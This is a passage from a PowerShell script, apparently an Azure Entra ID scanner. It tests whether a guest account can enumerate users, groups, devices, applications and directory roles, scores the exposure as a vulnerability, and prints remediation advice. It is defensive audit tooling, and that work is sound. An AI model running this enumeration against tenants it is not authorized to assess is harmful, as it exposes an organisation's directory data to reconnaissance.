        # 2.3 Test actual guest permissions by attempting to enumerate resources
        Write-ColorOutput -Message "`n[*] Testing guest access to directory resources..." -Color "Yellow"
        
        $permissionTests = @("Users", "Groups", "Devices", "Applications", "DirectoryRoles")
        $accessibleResources = @()
        
        foreach ($testType in $permissionTests) {
            Write-ColorOutput -Message "    [*] Testing access to: $testType..." -Color "DarkGray"
            $testResult = Test-GuestUserPermissions -TestType $testType
            
            if ($testResult.Accessible) {
                Write-ColorOutput -Message "    [+] $testType : ACCESSIBLE (Found $($testResult.ItemCount) items)" -Color "Green"
                $accessibleResources += $testType
                
                # This is a vulnerability if user is a guest
                if ($isGuest) {
                    $scanResults.Vulnerabilities += [PSCustomObject]@{
                        Type = "GuestEnumeration"
                        Risk = "HIGH"
                        Description = "Guest user can enumerate $testType - Azure Null Session equivalent"
                        Recommendation = "Review and restrict guest access to $testType"
                        ResourceType = $testType
                        ItemCount = $testResult.ItemCount
                    }
                    $scanResults.RiskScore += 15
                }
            } else {
                Write-ColorOutput -Message "    [-] $testType : BLOCKED" -Color "DarkGray"
            }
        }
        
        $scanResults.Phase2_Authenticated.AccessibleResources = $accessibleResources
        $scanResults.Phase2_Authenticated.PermissionTests = $permissionTests
        
        # 2.4 Compare guest vs member access
        Write-ColorOutput -Message "`n[*] Access Level Summary:" -Color "Yellow"
        Write-ColorOutput -Message "    Current User Type: $(if ($isGuest) { 'GUEST' } else { 'MEMBER' })" -Color $(if ($isGuest) { "Yellow" } else { "Cyan" })
        Write-ColorOutput -Message "    Accessible Resources: $($accessibleResources.Count) / $($permissionTests.Count)" -Color "Cyan"
        
        if ($isGuest -and $accessibleResources.Count -gt 0) {
            Write-ColorOutput -Message "    [!] VULNERABILITY: Guest can enumerate $($accessibleResources.Count) resource type(s)" -Color "Red"
        }
    }
    
    # ============================================
    # PHASE 3: SECURITY ASSESSMENT REPORT
    # ============================================
    Write-ColorOutput -Message "`n[*] PHASE 3: Security Assessment Report" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Calculate final risk score and rating
    $riskRating = if ($scanResults.RiskScore -ge 70) { "CRITICAL" }
                  elseif ($scanResults.RiskScore -ge 40) { "HIGH" }
                  elseif ($scanResults.RiskScore -ge 20) { "MEDIUM" }
                  else { "LOW" }
    
    $riskColor = switch ($riskRating) {
        "CRITICAL" { "Red" }
        "HIGH" { "Yellow" }
        "MEDIUM" { "Yellow" }
        "LOW" { "Green" }
    }
    
    Write-ColorOutput -Message "[*] Overall Risk Score: $($scanResults.RiskScore) / 100" -Color $riskColor
    Write-ColorOutput -Message "[*] Risk Rating: $riskRating" -Color $riskColor
    Write-ColorOutput -Message "[*] Vulnerabilities Found: $($scanResults.Vulnerabilities.Count)" -Color $(if ($scanResults.Vulnerabilities.Count -gt 0) { "Yellow" } else { "Green" })
    
    if ($scanResults.Vulnerabilities.Count -gt 0) {
        Write-ColorOutput -Message "`n[*] Vulnerability Details:" -Color "Yellow"
        
        foreach ($vuln in $scanResults.Vulnerabilities) {
            $vulnColor = switch ($vuln.Risk) {
                "CRITICAL" { "Red" }
                "HIGH" { "Red" }
                "MEDIUM" { "Yellow" }
                "LOW" { "DarkGray" }
            }
            
            Write-ColorOutput -Message "`n    [$($vuln.Risk)] $($vuln.Type)" -Color $vulnColor
            Write-ColorOutput -Message "    Description: $($vuln.Description)" -Color "DarkGray"
            Write-ColorOutput -Message "    Recommendation: $($vuln.Recommendation)" -Color "Cyan"
        }
    }
    
    # Summary
    $scanResults.Summary = @{
        RiskScore = $scanResults.RiskScore
        RiskRating = $riskRating
        VulnerabilityCount = $scanResults.Vulnerabilities.Count
        CriticalCount = ($scanResults.Vulnerabilities | Where-Object { $_.Risk -eq "CRITICAL" }).Count
        HighCount = ($scanResults.Vulnerabilities | Where-Object { $_.Risk -eq "HIGH" }).Count
        MediumCount = ($scanResults.Vulnerabilities | Where-Object { $_.Risk -eq "MEDIUM" }).Count
        LowCount = ($scanResults.Vulnerabilities | Where-Object { $_.Risk -eq "LOW" }).Count
    }
    
    Write-ColorOutput -Message "`n[*] Scan Complete!" -Color "Green"
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".json") {
                $scanResults | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "[+] Full report exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".csv") {
                $scanResults.Vulnerabilities | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "[+] Vulnerabilities exported to: $ExportPath" -Color "Green"
            } else {
                $scanResults | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "[+] Report exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    # Recommendations
    Write-ColorOutput -Message "`n[*] Next Steps:" -Color "Yellow"
    if ($scanResults.RiskScore -ge 40) {
        Write-ColorOutput -Message "    1. Review and restrict guest user permissions immediately" -Color "Cyan"
        Write-ColorOutput -Message "    2. Implement Conditional Access policies for guest users" -Color "Cyan"
        Write-ColorOutput -Message "    3. Audit existing guest accounts and remove unnecessary ones" -Color "Cyan"
        Write-ColorOutput -Message "    4. Enable guest access reviews in Azure Entra ID" -Color "Cyan"
    } else {
        Write-ColorOutput -Message "    1. Continue monitoring guest user activity" -Color "Cyan"
        Write-ColorOutput -Message "    2. Review guest access policies periodically" -Color "Cyan"
        Write-ColorOutput -Message "    3. Implement logging and alerting for guest enumeration" -Color "Cyan"
    }
    
    Write-ColorOutput -Message ""
}

# Tenant discovery function
